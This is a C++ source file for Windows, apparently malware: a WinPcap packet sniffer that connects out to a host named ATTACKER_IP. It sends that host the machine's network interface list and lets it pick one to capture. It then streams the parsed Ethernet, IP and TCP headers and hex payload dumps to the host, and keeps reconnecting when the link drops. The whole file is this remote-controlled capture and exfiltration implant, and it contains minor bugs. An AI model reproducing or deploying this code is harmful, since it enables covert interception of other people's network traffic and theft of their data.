#include"main.h"
int total_len;
int sub_len = 0;
CStringA str;
CStringA logger;
int PrintEtherNetHeader(unsigned const char* data)
{
	
	ETHERNET_HEADER* ethernet;
	
	ethernet = (ETHERNET_HEADER*)data;

	printf("\n===============Ether Net==================\n");
	logger.Append("\n===============Ether Net==================\n");
	printf("\nsrc MAC : [%02x:%02x:%02x:%02x:%02x:%02x]\n",

		ethernet->src.e_host[0],

		ethernet->src.e_host[1],

		ethernet->src.e_host[2],

		ethernet->src.e_host[3],

		ethernet->src.e_host[4],

		ethernet->src.e_host[5]);
	char src_mac[sizeof("\nsrc MAC : [%02x:%02x:%02x:%02x:%02x:%02x]\n")] = { 0, };
	sprintf(src_mac,"\nsrc MAC : [%02x:%02x:%02x:%02x:%02x:%02x]\n",
		ethernet->src.e_host[0],

		ethernet->src.e_host[1],

		ethernet->src.e_host[2],

		ethernet->src.e_host[3],

		ethernet->src.e_host[4],

		ethernet->src.e_host[5]);
	logger.Append(src_mac);

	printf("\ndst MAC : [%02x:%02x:%02x:%02x:%02x:%02x]\n",

		ethernet->dst.e_host[0],

		ethernet->dst.e_host[1],

		ethernet->dst.e_host[2],

		ethernet->dst.e_host[3],

		ethernet->dst.e_host[4],

		ethernet->dst.e_host[5]);

	printf("\nEthernet Type : %d\n", ntohs(ethernet->type));
	char dst_mac[sizeof("\nsrc MAC : [%02x:%02x:%02x:%02x:%02x:%02x]\n")] = { 0, };
	sprintf(dst_mac,"\ndst MAC : [%02x:%02x:%02x:%02x:%02x:%02x]\n",
		ethernet->dst.e_host[0],

		ethernet->dst.e_host[1],

		ethernet->dst.e_host[2],

		ethernet->dst.e_host[3],

		ethernet->dst.e_host[4],

		ethernet->dst.e_host[5]);

	logger.Append(dst_mac);
	return sizeof(ETHERNET_HEADER);

}

int PrintIpHeader(unsigned const char* data)
{
	string type;
	//1=ICMP, 2=IGMP, 6=TCP, 8= EGP, 17=UDP, 89=OSPF 등등등 

	IP_HEADER* ip;

	ip = (IP_HEADER*)data;

	printf("\n================IP HEADER===================\n");
	logger.Append("\n================IP HEADER===================\n");
	printf("IPv%d\n", ip->ver);
	logger.AppendFormat("IPv%d\n", ip->ver);
	printf("IP Header Total Len : %d\n", ntohs(ip->total_len) + 14);
	logger.AppendFormat("IP Header Total Len : %d\n", ntohs(ip->total_len) + 14);
	if (ip->protocol == 1) {
		type.append("TYPE : ICMP\n");
		logger.Append("TYPE : ICMP\n");
	}
	else if (ip->protocol == 2) {
		type.append("TYPE : IGMP\n");
		logger.Append("TYPE : IGMP\n");
	}

	else if (ip->protocol == 6) {
		type.append("TYPE : TCP\n");
		logger.Append("TYPE : TCP\n");
	}

	else if (ip->protocol == 17) {
		type.append("TYPE : UDP\n");
		logger.Append("TYPE : UDP\n");
	}

	else if (ip->protocol == 89) {
		type.append("TYPE : OSPF\n");
		logger.Append("TYPE : OSPF\n");
	}

	total_len = ntohs(ip->total_len) - 40;

	printf("\nSrc IP : %s\n", inet_ntoa(ip->src_ip));

	logger.AppendFormat("\nSrc IP : %s\n", inet_ntoa(ip->src_ip));

	printf("dst IP : %s\n", inet_ntoa(ip->dst_ip));

	logger.AppendFormat("dst IP : %s\n", inet_ntoa(ip->dst_ip));

	

	return sizeof(IP_HEADER);

}


int PrintTcpHeader(unsigned const char* data)
{

	TCP_HEADER* tcp;
	tcp = (TCP_HEADER*)data;

	printf("src Port : %d\n", ntohs(tcp->src_port));
	logger.AppendFormat("src Port : %d\n", ntohs(tcp->src_port));
	printf("dst Port : %d\n", ntohs(tcp->dst_port));
	logger.AppendFormat("dst Port : %d\n", ntohs(tcp->dst_port));
	printf("seq Number : %d\n", ntohs(tcp->seq));
	logger.AppendFormat("seq Number : %d\n", ntohs(tcp->seq));
	printf("ack Number : %d\n", ntohs(tcp->ack));
	logger.AppendFormat("ack Number : %d\n", ntohs(tcp->ack));
	if (tcp->flag_fin) {
		printf("fin\t");
		logger.Append("fin\t");
	}
	if (tcp->flag_syn) {
		printf("syn\t");
		logger.Append("syn\t");

	}
	if (tcp->flag_rst) {
		printf("rst\t");
		logger.Append("rst\t");
	}

	if (tcp->flag_psh) {
		printf("psh\t");
		logger.Append("psh\t");
	}
	if (tcp->flag_ack) {
		printf("ack\t");
		logger.Append("flag_ack\t");
	}
	if (tcp->flag_urg) {
		printf("urg\t");
		logger.Append("urg\t");
	}
	printf("\n");
	logger.Append("\n");
	return sizeof(TCP_HEADER);

}

void PrintData(unsigned const char* data)
{

	unsigned char* sub_data = (unsigned char*)data;

	int i = 0;

	printf("\n==============DATA================\n");
	logger.Append("\n==============DATA================\n");

	for (i = 1; i < total_len; i++) {

		printf("%02x ", *(sub_data++));
		logger.AppendFormat("%02x ", *(sub_data++));
		if (i % 16 == 0) {
			printf("\n");
			logger.Append("\n");
		}
	}

}



int Sniffing()
{
	WSADATA wsadata;
	
	pcap_t* pd=nullptr;
	pcap_if_t* dev_info, * sub_info;
	char err[PCAP_ERRBUF_SIZE] = { 0, };
	struct bpf_program fcode;
	struct pcap_pkthdr* p;
	int i;
	unsigned char* data;
	int offset;
	int res;
	int select;
	SOCKET ssock;
	SOCKADDR_IN saddr = { 0, };
	string str;
	

	ssock = socket(AF_INET, SOCK_STREAM, 0);
	
	WSAEVENT sevent=WSACreateEvent();
	WSAEventSelect(ssock, sevent, FD_CONNECT);
	
	
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
	saddr.sin_port = htons(SNIFFING_DEVICE_VIEW);

	while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR)
	{

		if (WSAGetLastError() == WSAEISCONN)
			break;

		cout << "접속 대기중" << endl;
		Sleep(1000);
	}
	

	while (1) 
	{

		
		DWORD dwWaitCode = MsgWaitForMultipleObjects(1, &sevent, FALSE, INFINITE, QS_POSTMESSAGE);
		if (dwWaitCode == WAIT_FAILED) 
		{
			SystemError(L"MsgWaitForMulileObject Error");
			//goto $connect;
			break;
		}
		if (dwWaitCode == WAIT_OBJECT_0 + 1)
			break;
	
		WSANETWORKEVENTS ne = {0,};
		WSAEnumNetworkEvents(ssock, sevent, &ne);


		if (ne.lNetworkEvents & FD_CONNECT) 
		{

			int errcode = ne.iErrorCode[FD_CONNECT_BIT];
			if(errcode != 0) 
			{
				break;
			}

			
	//	
			pcap_findalldevs(&dev_info, err);

			sub_info = dev_info;

			for (i = 1; sub_info; i++) {

				sub_info = sub_info->next;

			}
			if (send(ssock, (char*)&i, 4, 0) == SOCKET_ERROR)
				goto $jmp1;

			
			sub_info = dev_info;
			for (i = 1; sub_info; i++) {
				CStringA str;
				int size;
				printf("%d -> %s : %s\n", i, sub_info->name, sub_info->description);
				
				str.Format("%d -> %s : %s\n", i, sub_info->name, sub_info->description);
				size = str.GetLength();
				if (send(ssock, (char*)&size, 4, 0) == SOCKET_ERROR)
					goto $jmp1;
				if (send(ssock, str.GetString(), size, 0) == SOCKET_ERROR)
					goto $jmp1;
				
				sub_info = sub_info->next;

			}
			select = 0;


			//여기 예외처리 해야함
			while(select == 0)
				recv(ssock, (char*)&select, 4, 0);
			
			cout << "선택 완료" << endl;

			cout << "넘어온 값은 : " << select << endl;

			sub_info = dev_info;
			for (i = 1; i < select+1; i++)
			{

				sub_info = sub_info->next;

			}

			pd = pcap_open_live(sub_info->name, 65536, 1, 20, err);

			pcap_compile(pd, &fcode, "tcp", 1, NULL);

			pcap_setfilter(pd, &fcode);

			closesocket(ssock);
			ssock = socket(AF_INET, SOCK_STREAM, 0);
			saddr.sin_port = htons(PACKET_VIEW);
			sevent = WSACreateEvent();
			WSAEventSelect(ssock, sevent, FD_WRITE | FD_CLOSE);
			for (int i = 0; i < 10;i++) {

				if (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR)
					if (WSAGetLastError() == WSAEISCONN)
						break;
					else
						Sleep(1000);
			
			}
			

			continue;
		}

		if (ne.lNetworkEvents & FD_WRITE)
		{

			int errcode = ne.iErrorCode[FD_WRITE_BIT];
			if (errcode != 0)
			{
				goto $jmp1;
			}
			
			
			while ((res = pcap_next_ex(pd, &p, (const u_char**)&data)) >= 0)
			{

				int size = 0;
				CStringA packet_buffer;
				CStringA packet_buffer2;
				if (res == NULL)
					continue;

				IP_HEADER* ip = (IP_HEADER*)(data + 14);
				//cout <<htons(ip->total_len)+14<< endl;

				/*if (send(ssock, (char*)&size, 4, 0)==SOCKET_ERROR)
					goto $jmp1;*/
				
				/*if (send(ssock, (const char*)data, htons(ip->total_len) + 14, 0) == SOCKET_ERROR)
					goto $jmp1;*/
				packet_buffer.Format("Src IP : %s\n",
					inet_ntoa(ip->src_ip));
				
				/*packet_buffer2.Format("Dst IP : %s\t\t",
					inet_ntoa(ip->dst_ip));*/

				packet_buffer.AppendFormat("Dst IP : %s\t\t",
					inet_ntoa(ip->dst_ip));

				if (ip->protocol == 1)
					packet_buffer.Append("TYPE : ICMP\n");
				else if (ip->protocol == 2)
					packet_buffer.Append("TYPE : IGMP\n");
				else if (ip->protocol == 6)
					packet_buffer.Append("TYPE : TCP\n");
				else if (ip->protocol == 17)
					packet_buffer.Append("TYPE : UDP\n");
				else if (ip->protocol == 89)
					packet_buffer.Append("TYPE : OSPF\n");
				

			


				offset = PrintEtherNetHeader(data);

				data = data + offset;

				offset = PrintIpHeader(data);
				size = packet_buffer.GetLength();
				if (send(ssock, (char*)&size, 4, 0) == SOCKET_ERROR)
					goto $jmp1;

				if (send(ssock, (const char*)packet_buffer.GetString(), packet_buffer.GetLength(), 0) == SOCKET_ERROR)
					goto $jmp1;
				


				packet_buffer.Empty();

				data = data + offset;

				offset = PrintTcpHeader(data);

				data = data + offset;


				PrintData(data);
				
				size = logger.GetLength();
				if (send(ssock, (char*)&size, 4, 0) == SOCKET_ERROR)
					goto $jmp1;
				if (send(ssock, logger.GetString(), size, 0) == SOCKET_ERROR)
					goto $jmp1;
				
				logger.Empty();
				Sleep(10);

			}
			continue;
		}
		if (ne.lNetworkEvents & FD_CLOSE) 
		{
		$jmp1:
			if (ssock)
				closesocket(ssock);
			if (sevent)
				CloseHandle(sevent);
			
			pcap_close(pd);
			
			

			ssock = socket(AF_INET, SOCK_STREAM, 0);
			saddr.sin_port = htons(SNIFFING_DEVICE_VIEW);
			sevent = WSACreateEvent();
			WSAEventSelect(ssock, sevent, FD_CONNECT);
			while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR) 
			{
				if (WSAGetLastError() == WSAEISCONN)
					break;
				cout << "connecting......" << endl;
				Sleep(1000);
				
			}
			continue;

		
			
			
		}


	}

	return 0;
}


